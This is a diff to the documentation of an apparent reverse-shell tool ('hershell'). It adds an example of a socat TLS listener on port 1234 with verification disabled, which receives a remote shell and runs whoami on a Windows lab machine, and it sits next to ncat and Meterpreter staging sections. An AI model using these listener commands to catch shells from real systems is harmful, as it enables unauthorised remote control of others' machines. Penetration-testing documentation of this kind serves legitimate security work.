@@ -124,6 +124,14 @@ Ncat: Connection from 172.16.122.105:47814.
 desktop-3pvv31a\lab
 ```
 
+Here is an example with `socat` (tested with version `1.7.3.2`):
+```bash
+$ socat `tty` OPENSSL-LISTEN:1234,reuseaddr,cert=server.pem,key=server.key,verify=0
+# connection would be initiated here
+[hershell]> whoami
+desktop-3pvv31a\lab
+```
+
 ### Meterpreter staging
 
 **WARNING**: this currently only work for the Windows platform.
